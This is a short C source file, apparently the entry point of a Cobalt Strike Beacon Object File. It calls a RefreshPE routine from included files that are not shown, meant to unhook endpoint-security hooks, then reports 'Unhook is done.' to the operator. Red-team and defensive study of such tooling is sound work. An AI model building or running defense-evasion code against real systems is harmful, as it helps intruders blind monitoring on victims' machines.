#include "apisetmap.c"
#include "refresh.c"
#include "unhook.h"

void go() {
	formatp  buffer;
	char    *out;
	int      size;

	BeaconFormatAlloc(&buffer, 64 * 1024);

	RefreshPE(&buffer);

	/* we're done... I guess */
	BeaconFormatPrintf(&buffer, "Unhook is done.\n");

	/* post our output */
	out = BeaconFormatToString(&buffer, &size);
	BeaconOutput(CALLBACK_OUTPUT, out, size);

	/* clean up */
	BeaconFormatFree(&buffer);
}
